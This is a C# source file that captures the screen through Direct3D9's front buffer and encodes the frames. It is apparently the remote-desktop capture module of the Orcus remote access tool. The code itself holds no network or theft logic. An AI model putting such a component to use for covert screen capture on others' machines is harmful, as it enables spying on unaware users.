using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Orcus.Shared.Utilities.Compression;
using SharpDX.Direct3D9;

namespace Orcus.Commands.RemoteDesktop.Capture.FrontBuffer
{
    //9% CPU, 30 FPS
    public class FrontBufferService : IScreenCaptureService
    {
        private Device _device;
        private DisplayMode _displayMode;
        private Surface _surface;
        private ScreenHelper _screenHelper;
        private int _currentMonitor;

        public void Dispose()
        {
            _device?.Dispose();
            _surface?.Dispose();

            _device = null;
            _surface = null;
        }

        public bool IsSupported
        {
            get
            {
                try
                {
                    using (var direct3D = new Direct3D())
                    {
                        var displayMode = direct3D.GetAdapterDisplayMode(0);
                        using (var device = CreateDevice(direct3D, 0, displayMode))
                        {
                            return true;
                        }
                    }
                }
                catch (Exception)
                {
                    return false;
                }
            }
        }

        private static Device CreateDevice(Direct3D direct3D, int monitor, DisplayMode displayMode)
        {
            var parameters = new PresentParameters
            {
                Windowed = true,
                BackBufferCount = 1,
                BackBufferHeight = displayMode.Height,
                BackBufferWidth = displayMode.Width,
                SwapEffect = SwapEffect.Discard
            };
            return new Device(direct3D, monitor, DeviceType.Hardware, IntPtr.Zero,
                CreateFlags.SoftwareVertexProcessing, parameters);
        }

        public void Initialize(int monitor)
        {
            var direct3d = new Direct3D();
            _displayMode = direct3d.GetAdapterDisplayMode(monitor);

            //https://stackoverflow.com/questions/30021274/capture-screen-using-directx
            _device = CreateDevice(direct3d, monitor, _displayMode);
            _surface = Surface.CreateOffscreenPlain(_device, _displayMode.Width, _displayMode.Height, Format.A8R8G8B8,
                Pool.SystemMemory);
            _screenHelper = new ScreenHelper();
            _currentMonitor = monitor;
        }

        public void ChangeMonitor(int monitor)
        {
            Dispose();
            Initialize(monitor);
        }

        public RemoteDesktopDataInfo CaptureScreen(IStreamCodec streamCodec, ICursorStreamCodec cursorStreamCodec, bool updateCursor)
        {
            if (updateCursor)
                _screenHelper.UpdateCursor(cursorStreamCodec, _currentMonitor);

            _device.GetFrontBufferData(0, _surface);
            var rectangle = _surface.LockRectangle(LockFlags.None);

            try
            {
                return streamCodec.CodeImage(rectangle.DataPointer,
                    new Rectangle(0, 0, _displayMode.Width, _displayMode.Height),
                    new Size(_displayMode.Width, _displayMode.Height), PixelFormat.Format32bppArgb);
            }
            finally
            {
                _surface.UnlockRectangle();
            }
        }

        public Bitmap CaptureScreen()
        {
            _device.GetFrontBufferData(0, _surface);
            var rectangle = _surface.LockRectangle(LockFlags.None);

            var bitmap = new Bitmap(_displayMode.Width, _displayMode.Height, PixelFormat.Format32bppRgb);
            var bitmapData = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.WriteOnly,
                bitmap.PixelFormat);

            CopyMemory(bitmapData.Scan0, rectangle.DataPointer, (uint)(rectangle.Pitch * _displayMode.Height));

            /*var data = new byte[pitch*displayMode.Height];
            fixed (byte* p = data)
            {
                IntPtr ptr = (IntPtr) p;
                // do you stuff here
                CopyMemory(ptr, rectangle.DataPointer, (uint) data.Length);
            }*/
            _surface.UnlockRectangle();
            return bitmap;
        }

        [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
        public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
    }
}